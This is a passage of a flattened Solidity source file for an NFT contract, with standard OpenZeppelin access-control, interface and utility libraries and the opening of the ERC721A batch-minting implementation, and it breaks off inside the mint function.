1 // Sources flattened with hardhat v2.8.4 https://hardhat.org
2 
3 // File @openzeppelin/contracts/utils/Context.sol@v4.5.0
4 
5 // SPDX-License-Identifier: MIT
6 // OpenZeppelin Contracts v4.4.1 (utils/Context.sol)
7 
8 pragma solidity ^0.8.4;
9 
10 /**
11  * @dev Provides information about the current execution context, including the
12  * sender of the transaction and its data. While these are generally available
13  * via msg.sender and msg.data, they should not be accessed in such a direct
14  * manner, since when dealing with meta-transactions the account sending and
15  * paying for execution may not be the actual sender (as far as an application
16  * is concerned).
17  *
18  * This contract is only required for intermediate, library-like contracts.
19  */
20 abstract contract Context {
21     function _msgSender() internal view virtual returns (address) {
22         return msg.sender;
23     }
24 
25     function _msgData() internal view virtual returns (bytes calldata) {
26         return msg.data;
27     }
28 }
29 
30 
31 // File @openzeppelin/contracts/access/Ownable.sol@v4.5.0
32 
33 
34 // OpenZeppelin Contracts v4.4.1 (access/Ownable.sol)
35 
36 
37 
38 /**
39  * @dev Contract module which provides a basic access control mechanism, where
40  * there is an account (an owner) that can be granted exclusive access to
41  * specific functions.
42  *
43  * By default, the owner account will be the one that deploys the contract. This
44  * can later be changed with {transferOwnership}.
45  *
46  * This module is used through inheritance. It will make available the modifier
47  * `onlyOwner`, which can be applied to your functions to restrict their use to
48  * the owner.
49  */
50 abstract contract Ownable is Context {
51     address private _owner;
52 
53     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
54 
55     /**
56      * @dev Initializes the contract setting the deployer as the initial owner.
57      */
58     constructor() {
59         _transferOwnership(_msgSender());
60     }
61 
62     /**
63      * @dev Returns the address of the current owner.
64      */
65     function owner() public view virtual returns (address) {
66         return _owner;
67     }
68 
69     /**
70      * @dev Throws if called by any account other than the owner.
71      */
72     modifier onlyOwner() {
73         require(owner() == _msgSender(), "Ownable: caller is not the owner");
74         _;
75     }
76 
77     /**
78      * @dev Leaves the contract without owner. It will not be possible to call
79      * `onlyOwner` functions anymore. Can only be called by the current owner.
80      *
81      * NOTE: Renouncing ownership will leave the contract without an owner,
82      * thereby removing any functionality that is only available to the owner.
83      */
84     function renounceOwnership() public virtual onlyOwner {
85         _transferOwnership(address(0));
86     }
87 
88     /**
89      * @dev Transfers ownership of the contract to a new account (`newOwner`).
90      * Can only be called by the current owner.
91      */
92     function transferOwnership(address newOwner) public virtual onlyOwner {
93         require(newOwner != address(0), "Ownable: new owner is the zero address");
94         _transferOwnership(newOwner);
95     }
96 
97     /**
98      * @dev Transfers ownership of the contract to a new account (`newOwner`).
99      * Internal function without access restriction.
100      */
101     function _transferOwnership(address newOwner) internal virtual {
102         address oldOwner = _owner;
103         _owner = newOwner;
104         emit OwnershipTransferred(oldOwner, newOwner);
105     }
106 }
107 
108 
109 // File @openzeppelin/contracts/utils/introspection/IERC165.sol@v4.5.0
110 
111 
112 // OpenZeppelin Contracts v4.4.1 (utils/introspection/IERC165.sol)
113 
114 
115 
116 /**
117  * @dev Interface of the ERC165 standard, as defined in the
118  * https://eips.ethereum.org/EIPS/eip-165[EIP].
119  *
120  * Implementers can declare support of contract interfaces, which can then be
121  * queried by others ({ERC165Checker}).
122  *
123  * For an implementation, see {ERC165}.
124  */
125 interface IERC165 {
126     /**
127      * @dev Returns true if this contract implements the interface defined by
128      * `interfaceId`. See the corresponding
129      * https://eips.ethereum.org/EIPS/eip-165#how-interfaces-are-identified[EIP section]
130      * to learn more about how these ids are created.
131      *
132      * This function call must use less than 30 000 gas.
133      */
134     function supportsInterface(bytes4 interfaceId) external view returns (bool);
135 }
136 
137 
138 // File @openzeppelin/contracts/token/ERC721/IERC721.sol@v4.5.0
139 
140 
141 // OpenZeppelin Contracts v4.4.1 (token/ERC721/IERC721.sol)
142 
143 
144 
145 /**
146  * @dev Required interface of an ERC721 compliant contract.
147  */
148 interface IERC721 is IERC165 {
149     /**
150      * @dev Emitted when `tokenId` token is transferred from `from` to `to`.
151      */
152     event Transfer(address indexed from, address indexed to, uint256 indexed tokenId);
153 
154     /**
155      * @dev Emitted when `owner` enables `approved` to manage the `tokenId` token.
156      */
157     event Approval(address indexed owner, address indexed approved, uint256 indexed tokenId);
158 
159     /**
160      * @dev Emitted when `owner` enables or disables (`approved`) `operator` to manage all of its assets.
161      */
162     event ApprovalForAll(address indexed owner, address indexed operator, bool approved);
163 
164     /**
165      * @dev Returns the number of tokens in ``owner``'s account.
166      */
167     function balanceOf(address owner) external view returns (uint256 balance);
168 
169     /**
170      * @dev Returns the owner of the `tokenId` token.
171      *
172      * Requirements:
173      *
174      * - `tokenId` must exist.
175      */
176     function ownerOf(uint256 tokenId) external view returns (address owner);
177 
178     /**
179      * @dev Safely transfers `tokenId` token from `from` to `to`, checking first that contract recipients
180      * are aware of the ERC721 protocol to prevent tokens from being forever locked.
181      *
182      * Requirements:
183      *
184      * - `from` cannot be the zero address.
185      * - `to` cannot be the zero address.
186      * - `tokenId` token must exist and be owned by `from`.
187      * - If the caller is not `from`, it must be have been allowed to move this token by either {approve} or {setApprovalForAll}.
188      * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
189      *
190      * Emits a {Transfer} event.
191      */
192     function safeTransferFrom(
193         address from,
194         address to,
195         uint256 tokenId
196     ) external;
197 
198     /**
199      * @dev Transfers `tokenId` token from `from` to `to`.
200      *
201      * WARNING: Usage of this method is discouraged, use {safeTransferFrom} whenever possible.
202      *
203      * Requirements:
204      *
205      * - `from` cannot be the zero address.
206      * - `to` cannot be the zero address.
207      * - `tokenId` token must be owned by `from`.
208      * - If the caller is not `from`, it must be approved to move this token by either {approve} or {setApprovalForAll}.
209      *
210      * Emits a {Transfer} event.
211      */
212     function transferFrom(
213         address from,
214         address to,
215         uint256 tokenId
216     ) external;
217 
218     /**
219      * @dev Gives permission to `to` to transfer `tokenId` token to another account.
220      * The approval is cleared when the token is transferred.
221      *
222      * Only a single account can be approved at a time, so approving the zero address clears previous approvals.
223      *
224      * Requirements:
225      *
226      * - The caller must own the token or be an approved operator.
227      * - `tokenId` must exist.
228      *
229      * Emits an {Approval} event.
230      */
231     function approve(address to, uint256 tokenId) external;
232 
233     /**
234      * @dev Returns the account approved for `tokenId` token.
235      *
236      * Requirements:
237      *
238      * - `tokenId` must exist.
239      */
240     function getApproved(uint256 tokenId) external view returns (address operator);
241 
242     /**
243      * @dev Approve or remove `operator` as an operator for the caller.
244      * Operators can call {transferFrom} or {safeTransferFrom} for any token owned by the caller.
245      *
246      * Requirements:
247      *
248      * - The `operator` cannot be the caller.
249      *
250      * Emits an {ApprovalForAll} event.
251      */
252     function setApprovalForAll(address operator, bool _approved) external;
253 
254     /**
255      * @dev Returns if the `operator` is allowed to manage all of the assets of `owner`.
256      *
257      * See {setApprovalForAll}
258      */
259     function isApprovedForAll(address owner, address operator) external view returns (bool);
260 
261     /**
262      * @dev Safely transfers `tokenId` token from `from` to `to`.
263      *
264      * Requirements:
265      *
266      * - `from` cannot be the zero address.
267      * - `to` cannot be the zero address.
268      * - `tokenId` token must exist and be owned by `from`.
269      * - If the caller is not `from`, it must be approved to move this token by either {approve} or {setApprovalForAll}.
270      * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
271      *
272      * Emits a {Transfer} event.
273      */
274     function safeTransferFrom(
275         address from,
276         address to,
277         uint256 tokenId,
278         bytes calldata data
279     ) external;
280 }
281 
282 
283 // File @openzeppelin/contracts/token/ERC721/IERC721Receiver.sol@v4.5.0
284 
285 
286 // OpenZeppelin Contracts v4.4.1 (token/ERC721/IERC721Receiver.sol)
287 
288 
289 
290 /**
291  * @title ERC721 token receiver interface
292  * @dev Interface for any contract that wants to support safeTransfers
293  * from ERC721 asset contracts.
294  */
295 interface IERC721Receiver {
296     /**
297      * @dev Whenever an {IERC721} `tokenId` token is transferred to this contract via {IERC721-safeTransferFrom}
298      * by `operator` from `from`, this function is called.
299      *
300      * It must return its Solidity selector to confirm the token transfer.
301      * If any other value is returned or the interface is not implemented by the recipient, the transfer will be reverted.
302      *
303      * The selector can be obtained in Solidity with `IERC721.onERC721Received.selector`.
304      */
305     function onERC721Received(
306         address operator,
307         address from,
308         uint256 tokenId,
309         bytes calldata data
310     ) external returns (bytes4);
311 }
312 
313 
314 // File @openzeppelin/contracts/token/ERC721/extensions/IERC721Metadata.sol@v4.5.0
315 
316 
317 // OpenZeppelin Contracts v4.4.1 (token/ERC721/extensions/IERC721Metadata.sol)
318 
319 
320 
321 /**
322  * @title ERC-721 Non-Fungible Token Standard, optional metadata extension
323  * @dev See https://eips.ethereum.org/EIPS/eip-721
324  */
325 interface IERC721Metadata is IERC721 {
326     /**
327      * @dev Returns the token collection name.
328      */
329     function name() external view returns (string memory);
330 
331     /**
332      * @dev Returns the token collection symbol.
333      */
334     function symbol() external view returns (string memory);
335 
336     /**
337      * @dev Returns the Uniform Resource Identifier (URI) for `tokenId` token.
338      */
339     function tokenURI(uint256 tokenId) external view returns (string memory);
340 }
341 
342 
343 // File @openzeppelin/contracts/token/ERC721/extensions/IERC721Enumerable.sol@v4.5.0
344 
345 
346 // OpenZeppelin Contracts (last updated v4.5.0) (token/ERC721/extensions/IERC721Enumerable.sol)
347 
348 
349 
350 /**
351  * @title ERC-721 Non-Fungible Token Standard, optional enumeration extension
352  * @dev See https://eips.ethereum.org/EIPS/eip-721
353  */
354 interface IERC721Enumerable is IERC721 {
355     /**
356      * @dev Returns the total amount of tokens stored by the contract.
357      */
358     function totalSupply() external view returns (uint256);
359 
360     /**
361      * @dev Returns a token ID owned by `owner` at a given `index` of its token list.
362      * Use along with {balanceOf} to enumerate all of ``owner``'s tokens.
363      */
364     function tokenOfOwnerByIndex(address owner, uint256 index) external view returns (uint256);
365 
366     /**
367      * @dev Returns a token ID at a given `index` of all the tokens stored by the contract.
368      * Use along with {totalSupply} to enumerate all tokens.
369      */
370     function tokenByIndex(uint256 index) external view returns (uint256);
371 }
372 
373 
374 // File @openzeppelin/contracts/utils/Address.sol@v4.5.0
375 
376 
377 // OpenZeppelin Contracts (last updated v4.5.0) (utils/Address.sol)
378 
379 pragma solidity ^0.8.1;
380 
381 /**
382  * @dev Collection of functions related to the address type
383  */
384 library Address {
385     /**
386      * @dev Returns true if `account` is a contract.
387      *
388      * [IMPORTANT]
389      * ====
390      * It is unsafe to assume that an address for which this function returns
391      * false is an externally-owned account (EOA) and not a contract.
392      *
393      * Among others, `isContract` will return false for the following
394      * types of addresses:
395      *
396      *  - an externally-owned account
397      *  - a contract in construction
398      *  - an address where a contract will be created
399      *  - an address where a contract lived, but was destroyed
400      * ====
401      *
402      * [IMPORTANT]
403      * ====
404      * You shouldn't rely on `isContract` to protect against flash loan attacks!
405      *
406      * Preventing calls from contracts is highly discouraged. It breaks composability, breaks support for smart wallets
407      * like Gnosis Safe, and does not provide security since it can be circumvented by calling from a contract
408      * constructor.
409      * ====
410      */
411     function isContract(address account) internal view returns (bool) {
412         // This method relies on extcodesize/address.code.length, which returns 0
413         // for contracts in construction, since the code is only stored at the end
414         // of the constructor execution.
415 
416         return account.code.length > 0;
417     }
418 
419     /**
420      * @dev Replacement for Solidity's `transfer`: sends `amount` wei to
421      * `recipient`, forwarding all available gas and reverting on errors.
422      *
423      * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost
424      * of certain opcodes, possibly making contracts go over the 2300 gas limit
425      * imposed by `transfer`, making them unable to receive funds via
426      * `transfer`. {sendValue} removes this limitation.
427      *
428      * https://diligence.consensys.net/posts/2019/09/stop-using-soliditys-transfer-now/[Learn more].
429      *
430      * IMPORTANT: because control is transferred to `recipient`, care must be
431      * taken to not create reentrancy vulnerabilities. Consider using
432      * {ReentrancyGuard} or the
433      * https://solidity.readthedocs.io/en/v0.5.11/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].
434      */
435     function sendValue(address payable recipient, uint256 amount) internal {
436         require(address(this).balance >= amount, "Address: insufficient balance");
437 
438         (bool success, ) = recipient.call{value: amount}("");
439         require(success, "Address: unable to send value, recipient may have reverted");
440     }
441 
442     /**
443      * @dev Performs a Solidity function call using a low level `call`. A
444      * plain `call` is an unsafe replacement for a function call: use this
445      * function instead.
446      *
447      * If `target` reverts with a revert reason, it is bubbled up by this
448      * function (like regular Solidity function calls).
449      *
450      * Returns the raw returned data. To convert to the expected return value,
451      * use https://solidity.readthedocs.io/en/latest/units-and-global-variables.html?highlight=abi.decode#abi-encoding-and-decoding-functions[`abi.decode`].
452      *
453      * Requirements:
454      *
455      * - `target` must be a contract.
456      * - calling `target` with `data` must not revert.
457      *
458      * _Available since v3.1._
459      */
460     function functionCall(address target, bytes memory data) internal returns (bytes memory) {
461         return functionCall(target, data, "Address: low-level call failed");
462     }
463 
464     /**
465      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`], but with
466      * `errorMessage` as a fallback revert reason when `target` reverts.
467      *
468      * _Available since v3.1._
469      */
470     function functionCall(
471         address target,
472         bytes memory data,
473         string memory errorMessage
474     ) internal returns (bytes memory) {
475         return functionCallWithValue(target, data, 0, errorMessage);
476     }
477 
478     /**
479      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
480      * but also transferring `value` wei to `target`.
481      *
482      * Requirements:
483      *
484      * - the calling contract must have an ETH balance of at least `value`.
485      * - the called Solidity function must be `payable`.
486      *
487      * _Available since v3.1._
488      */
489     function functionCallWithValue(
490         address target,
491         bytes memory data,
492         uint256 value
493     ) internal returns (bytes memory) {
494         return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
495     }
496 
497     /**
498      * @dev Same as {xref-Address-functionCallWithValue-address-bytes-uint256-}[`functionCallWithValue`], but
499      * with `errorMessage` as a fallback revert reason when `target` reverts.
500      *
501      * _Available since v3.1._
502      */
503     function functionCallWithValue(
504         address target,
505         bytes memory data,
506         uint256 value,
507         string memory errorMessage
508     ) internal returns (bytes memory) {
509         require(address(this).balance >= value, "Address: insufficient balance for call");
510         require(isContract(target), "Address: call to non-contract");
511 
512         (bool success, bytes memory returndata) = target.call{value: value}(data);
513         return verifyCallResult(success, returndata, errorMessage);
514     }
515 
516     /**
517      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
518      * but performing a static call.
519      *
520      * _Available since v3.3._
521      */
522     function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {
523         return functionStaticCall(target, data, "Address: low-level static call failed");
524     }
525 
526     /**
527      * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],
528      * but performing a static call.
529      *
530      * _Available since v3.3._
531      */
532     function functionStaticCall(
533         address target,
534         bytes memory data,
535         string memory errorMessage
536     ) internal view returns (bytes memory) {
537         require(isContract(target), "Address: static call to non-contract");
538 
539         (bool success, bytes memory returndata) = target.staticcall(data);
540         return verifyCallResult(success, returndata, errorMessage);
541     }
542 
543     /**
544      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
545      * but performing a delegate call.
546      *
547      * _Available since v3.4._
548      */
549     function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {
550         return functionDelegateCall(target, data, "Address: low-level delegate call failed");
551     }
552 
553     /**
554      * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],
555      * but performing a delegate call.
556      *
557      * _Available since v3.4._
558      */
559     function functionDelegateCall(
560         address target,
561         bytes memory data,
562         string memory errorMessage
563     ) internal returns (bytes memory) {
564         require(isContract(target), "Address: delegate call to non-contract");
565 
566         (bool success, bytes memory returndata) = target.delegatecall(data);
567         return verifyCallResult(success, returndata, errorMessage);
568     }
569 
570     /**
571      * @dev Tool to verifies that a low level call was successful, and revert if it wasn't, either by bubbling the
572      * revert reason using the provided one.
573      *
574      * _Available since v4.3._
575      */
576     function verifyCallResult(
577         bool success,
578         bytes memory returndata,
579         string memory errorMessage
580     ) internal pure returns (bytes memory) {
581         if (success) {
582             return returndata;
583         } else {
584             // Look for revert reason and bubble it up if present
585             if (returndata.length > 0) {
586                 // The easiest way to bubble the revert reason is using memory via assembly
587 
588                 assembly {
589                     let returndata_size := mload(returndata)
590                     revert(add(32, returndata), returndata_size)
591                 }
592             } else {
593                 revert(errorMessage);
594             }
595         }
596     }
597 }
598 
599 
600 // File @openzeppelin/contracts/utils/Strings.sol@v4.5.0
601 
602 
603 // OpenZeppelin Contracts v4.4.1 (utils/Strings.sol)
604 
605 
606 
607 /**
608  * @dev String operations.
609  */
610 library Strings {
611     bytes16 private constant _HEX_SYMBOLS = "0123456789abcdef";
612 
613     /**
614      * @dev Converts a `uint256` to its ASCII `string` decimal representation.
615      */
616     function toString(uint256 value) internal pure returns (string memory) {
617         // Inspired by OraclizeAPI's implementation - MIT licence
618         // https://github.com/oraclize/ethereum-api/blob/b42146b063c7d6ee1358846c198246239e9360e8/oraclizeAPI_0.4.25.sol
619 
620         if (value == 0) {
621             return "0";
622         }
623         uint256 temp = value;
624         uint256 digits;
625         while (temp != 0) {
626             digits++;
627             temp /= 10;
628         }
629         bytes memory buffer = new bytes(digits);
630         while (value != 0) {
631             digits -= 1;
632             buffer[digits] = bytes1(uint8(48 + uint256(value % 10)));
633             value /= 10;
634         }
635         return string(buffer);
636     }
637 
638     /**
639      * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation.
640      */
641     function toHexString(uint256 value) internal pure returns (string memory) {
642         if (value == 0) {
643             return "0x00";
644         }
645         uint256 temp = value;
646         uint256 length = 0;
647         while (temp != 0) {
648             length++;
649             temp >>= 8;
650         }
651         return toHexString(value, length);
652     }
653 
654     /**
655      * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation with fixed length.
656      */
657     function toHexString(uint256 value, uint256 length) internal pure returns (string memory) {
658         bytes memory buffer = new bytes(2 * length + 2);
659         buffer[0] = "0";
660         buffer[1] = "x";
661         for (uint256 i = 2 * length + 1; i > 1; --i) {
662             buffer[i] = _HEX_SYMBOLS[value & 0xf];
663             value >>= 4;
664         }
665         require(value == 0, "Strings: hex length insufficient");
666         return string(buffer);
667     }
668 }
669 
670 
671 // File @openzeppelin/contracts/utils/introspection/ERC165.sol@v4.5.0
672 
673 
674 // OpenZeppelin Contracts v4.4.1 (utils/introspection/ERC165.sol)
675 
676 
677 
678 /**
679  * @dev Implementation of the {IERC165} interface.
680  *
681  * Contracts that want to implement ERC165 should inherit from this contract and override {supportsInterface} to check
682  * for the additional interface id that will be supported. For example:
683  *
684  * ```solidity
685  * function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
686  *     return interfaceId == type(MyInterface).interfaceId || super.supportsInterface(interfaceId);
687  * }
688  * ```
689  *
690  * Alternatively, {ERC165Storage} provides an easier to use but more expensive implementation.
691  */
692 abstract contract ERC165 is IERC165 {
693     /**
694      * @dev See {IERC165-supportsInterface}.
695      */
696     function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
697         return interfaceId == type(IERC165).interfaceId;
698     }
699 }
700 
701 
702 // File erc721a/contracts/ERC721A.sol@v3.0.0
703 
704 
705 // Creator: Chiru Labs
706 
707 error ApprovalCallerNotOwnerNorApproved();
708 error ApprovalQueryForNonexistentToken();
709 error ApproveToCaller();
710 error ApprovalToCurrentOwner();
711 error BalanceQueryForZeroAddress();
712 error MintedQueryForZeroAddress();
713 error BurnedQueryForZeroAddress();
714 error AuxQueryForZeroAddress();
715 error MintToZeroAddress();
716 error MintZeroQuantity();
717 error OwnerIndexOutOfBounds();
718 error OwnerQueryForNonexistentToken();
719 error TokenIndexOutOfBounds();
720 error TransferCallerNotOwnerNorApproved();
721 error TransferFromIncorrectOwner();
722 error TransferToNonERC721ReceiverImplementer();
723 error TransferToZeroAddress();
724 error URIQueryForNonexistentToken();
725 
726 /**
727  * @dev Implementation of https://eips.ethereum.org/EIPS/eip-721[ERC721] Non-Fungible Token Standard, including
728  * the Metadata extension. Built to optimize for lower gas during batch mints.
729  *
730  * Assumes serials are sequentially minted starting at _startTokenId() (defaults to 0, e.g. 0, 1, 2, 3..).
731  *
732  * Assumes that an owner cannot have more than 2**64 - 1 (max value of uint64) of supply.
733  *
734  * Assumes that the maximum token id cannot exceed 2**256 - 1 (max value of uint256).
735  */
736 contract ERC721A is Context, ERC165, IERC721, IERC721Metadata {
737     using Address for address;
738     using Strings for uint256;
739 
740     // Compiler will pack this into a single 256bit word.
741     struct TokenOwnership {
742         // The address of the owner.
743         address addr;
744         // Keeps track of the start time of ownership with minimal overhead for tokenomics.
745         uint64 startTimestamp;
746         // Whether the token has been burned.
747         bool burned;
748     }
749 
750     // Compiler will pack this into a single 256bit word.
751     struct AddressData {
752         // Realistically, 2**64-1 is more than enough.
753         uint64 balance;
754         // Keeps track of mint count with minimal overhead for tokenomics.
755         uint64 numberMinted;
756         // Keeps track of burn count with minimal overhead for tokenomics.
757         uint64 numberBurned;
758         // For miscellaneous variable(s) pertaining to the address
759         // (e.g. number of whitelist mint slots used).
760         // If there are multiple variables, please pack them into a uint64.
761         uint64 aux;
762     }
763 
764     // The tokenId of the next token to be minted.
765     uint256 internal _currentIndex;
766 
767     // The number of tokens burned.
768     uint256 internal _burnCounter;
769 
770     // Token name
771     string private _name;
772 
773     // Token symbol
774     string private _symbol;
775 
776     // Collection size
777     uint256 public constant colectionSize = 500000;
778 
779     // Mapping from token ID to ownership details
780     // An empty struct value does not necessarily mean the token is unowned. See ownershipOf implementation for details.
781     mapping(uint256 => TokenOwnership) internal _ownerships;
782 
783     // Mapping owner address to address data
784     mapping(address => AddressData) private _addressData;
785 
786     // Mapping from token ID to approved address
787     mapping(uint256 => address) private _tokenApprovals;
788 
789     // Mapping from owner to operator approvals
790     mapping(address => mapping(address => bool)) private _operatorApprovals;
791 
792     constructor(string memory name_, string memory symbol_) {
793         _name = name_;
794         _symbol = symbol_;
795         _currentIndex = _startTokenId();
796     }
797 
798     /**
799      * To change the starting tokenId, please override this function.
800      */
801     function _startTokenId() internal view virtual returns (uint256) {
802         return 0;
803     }
804 
805     /**
806      * @dev See {IERC721Enumerable-totalSupply}.
807      * @dev Burned tokens are calculated here, use _totalMinted() if you want to count just minted tokens.
808      */
809     function totalSupply() public view returns (uint256) {
810         // Counter underflow is impossible as _burnCounter cannot be incremented
811         // more than _currentIndex - _startTokenId() times
812         unchecked {
813             return _currentIndex - _burnCounter - _startTokenId();
814         }
815     }
816 
817     /**
818      * Returns the total amount of tokens minted in the contract.
819      */
820     function _totalMinted() internal view returns (uint256) {
821         // Counter underflow is impossible as _currentIndex does not decrement,
822         // and it is initialized to _startTokenId()
823         unchecked {
824             return _currentIndex - _startTokenId();
825         }
826     }
827 
828     /**
829      * @dev See {IERC165-supportsInterface}.
830      */
831     function supportsInterface(bytes4 interfaceId) public view virtual override(ERC165, IERC165) returns (bool) {
832         return
833             interfaceId == type(IERC721).interfaceId ||
834             interfaceId == type(IERC721Metadata).interfaceId ||
835             super.supportsInterface(interfaceId);
836     }
837 
838     /**
839      * @dev See {IERC721-balanceOf}.
840      */
841     function balanceOf(address owner) public view override returns (uint256) {
842         if (owner == address(0)) revert BalanceQueryForZeroAddress();
843         return uint256(_addressData[owner].balance);
844     }
845 
846     /**
847      * Returns the number of tokens minted by `owner`.
848      */
849     function _numberMinted(address owner) internal view returns (uint256) {
850         if (owner == address(0)) revert MintedQueryForZeroAddress();
851         return uint256(_addressData[owner].numberMinted);
852     }
853 
854     /**
855      * Returns the number of tokens burned by or on behalf of `owner`.
856      */
857     function _numberBurned(address owner) internal view returns (uint256) {
858         if (owner == address(0)) revert BurnedQueryForZeroAddress();
859         return uint256(_addressData[owner].numberBurned);
860     }
861 
862     /**
863      * Returns the auxillary data for `owner`. (e.g. number of whitelist mint slots used).
864      */
865     function _getAux(address owner) internal view returns (uint64) {
866         if (owner == address(0)) revert AuxQueryForZeroAddress();
867         return _addressData[owner].aux;
868     }
869 
870     /**
871      * Sets the auxillary data for `owner`. (e.g. number of whitelist mint slots used).
872      * If there are multiple variables, please pack them into a uint64.
873      */
874     function _setAux(address owner, uint64 aux) internal {
875         if (owner == address(0)) revert AuxQueryForZeroAddress();
876         _addressData[owner].aux = aux;
877     }
878 
879     /**
880      * Gas spent here starts off proportional to the maximum mint batch size.
881      * It gradually moves to O(1) as tokens get transferred around in the collection over time.
882      */
883     function ownershipOf(uint256 tokenId) internal view returns (TokenOwnership memory) {
884         uint256 curr = tokenId;
885 
886         unchecked {
887             if (_startTokenId() <= curr && curr < _currentIndex) {
888                 TokenOwnership memory ownership = _ownerships[curr];
889                 if (!ownership.burned) {
890                     if (ownership.addr != address(0)) {
891                         return ownership;
892                     }
893                     // Invariant:
894                     // There will always be an ownership that has an address and is not burned
895                     // before an ownership that does not have an address and is not burned.
896                     // Hence, curr will not underflow.
897                     while (true) {
898                         curr--;
899                         ownership = _ownerships[curr];
900                         if (ownership.addr != address(0)) {
901                             return ownership;
902                         }
903                     }
904                 }
905             }
906         }
907         revert OwnerQueryForNonexistentToken();
908     }
909 
910     /**
911      * @dev See {IERC721-ownerOf}.
912      */
913     function ownerOf(uint256 tokenId) public view override returns (address) {
914         return ownershipOf(tokenId).addr;
915     }
916 
917     /**
918      * @dev See {IERC721Metadata-name}.
919      */
920     function name() public view virtual override returns (string memory) {
921         return _name;
922     }
923 
924     /**
925      * @dev See {IERC721Metadata-symbol}.
926      */
927     function symbol() public view virtual override returns (string memory) {
928         return _symbol;
929     }
930 
931     /**
932      * @dev See {IERC721Metadata-tokenURI}.
933      */
934     function tokenURI(uint256 tokenId) public view virtual override returns (string memory) {
935         if (!_exists(tokenId)) revert URIQueryForNonexistentToken();
936 
937         string memory baseURI = _baseURI();
938         return bytes(baseURI).length != 0 ? string(abi.encodePacked(baseURI, tokenId.toString())) : '';
939     }
940 
941     /**
942      * @dev Base URI for computing {tokenURI}. If set, the resulting URI for each
943      * token will be the concatenation of the `baseURI` and the `tokenId`. Empty
944      * by default, can be overriden in child contracts.
945      */
946     function _baseURI() internal view virtual returns (string memory) {
947         return '';
948     }
949 
950     /**
951      * @dev See {IERC721-approve}.
952      */
953     function approve(address to, uint256 tokenId) public override {
954         address owner = ERC721A.ownerOf(tokenId);
955         if (to == owner) revert ApprovalToCurrentOwner();
956 
957         if (_msgSender() != owner && !isApprovedForAll(owner, _msgSender())) {
958             revert ApprovalCallerNotOwnerNorApproved();
959         }
960 
961         _approve(to, tokenId, owner);
962     }
963 
964     /**
965      * @dev See {IERC721-getApproved}.
966      */
967     function getApproved(uint256 tokenId) public view override returns (address) {
968         if (!_exists(tokenId)) revert ApprovalQueryForNonexistentToken();
969 
970         return _tokenApprovals[tokenId];
971     }
972 
973     /**
974      * @dev See {IERC721-setApprovalForAll}.
975      */
976     function setApprovalForAll(address operator, bool approved) public override {
977         if (operator == _msgSender()) revert ApproveToCaller();
978 
979         _operatorApprovals[_msgSender()][operator] = approved;
980         emit ApprovalForAll(_msgSender(), operator, approved);
981     }
982 
983     /**
984      * @dev See {IERC721-isApprovedForAll}.
985      */
986     function isApprovedForAll(address owner, address operator) public view virtual override returns (bool) {
987         return _operatorApprovals[owner][operator];
988     }
989 
990     /**
991      * @dev See {IERC721-transferFrom}.
992      */
993     function transferFrom(
994         address from,
995         address to,
996         uint256 tokenId
997     ) public virtual override {
998         _transfer(from, to, tokenId);
999     }
1000 
1001     /**
1002      * @dev See {IERC721-safeTransferFrom}.
1003      */
1004     function safeTransferFrom(
1005         address from,
1006         address to,
1007         uint256 tokenId
1008     ) public virtual override {
1009         safeTransferFrom(from, to, tokenId, '');
1010     }
1011 
1012     /**
1013      * @dev See {IERC721-safeTransferFrom}.
1014      */
1015     function safeTransferFrom(
1016         address from,
1017         address to,
1018         uint256 tokenId,
1019         bytes memory _data
1020     ) public virtual override {
1021         _transfer(from, to, tokenId);
1022         if (to.isContract() && !_checkContractOnERC721Received(from, to, tokenId, _data)) {
1023             revert TransferToNonERC721ReceiverImplementer();
1024         }
1025     }
1026 
1027     /**
1028      * @dev Returns whether `tokenId` exists.
1029      *
1030      * Tokens can be managed by their owner or approved accounts via {approve} or {setApprovalForAll}.
1031      *
1032      * Tokens start existing when they are minted (`_mint`),
1033      */
1034     function _exists(uint256 tokenId) internal view returns (bool) {
1035         return _startTokenId() <= tokenId && tokenId < _currentIndex &&
1036             !_ownerships[tokenId].burned;
1037     }
1038 
1039     function _safeMint(address to, uint256 quantity) internal {
1040         _safeMint(to, quantity, '');
1041     }
1042 
1043     /**
1044      * @dev Safely mints `quantity` tokens and transfers them to `to`.
1045      *
1046      * Requirements:
1047      *
1048      * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called for each safe transfer.
1049      * - `quantity` must be greater than 0.
1050      *
1051      * Emits a {Transfer} event.
1052      */
1053     function _safeMint(
1054         address to,
1055         uint256 quantity,
1056         bytes memory _data
1057     ) internal {
1058         _mint(to, quantity, _data, true);
1059     }
1060 
1061     /**
1062      * @dev Mints `quantity` tokens and transfers them to `to`.
1063      *
1064      * Requirements:
1065      *
1066      * - `to` cannot be the zero address.
1067      * - `quantity` must be greater than 0.
1068      *
1069      * Emits a {Transfer} event.
1070      */
1071     function _mint(
1072         address to,
1073         uint256 quantity,
1074         bytes memory _data,
1075         bool safe
1076     ) internal {
1077         uint256 startTokenId = _currentIndex;
1078         if (to == address(0)) revert MintToZeroAddress();
1079         if (quantity == 0) revert MintZeroQuantity();
1080 
1081         _beforeTokenTransfers(address(0), to, startTokenId, quantity);
1082 
1083         // Overflows are incredibly unrealistic.
1084         // balance or numberMinted overflow if current value of either + quantity > 1.8e19 (2**64) - 1
1085         // updatedIndex overflows if _currentIndex + quantity > 1.2e77 (2**256) - 1
1086         unchecked {
1087             _addressData[to].balance += uint64(quantity);
1088             _addressData[to].numberMinted += uint64(quantity);
1089 
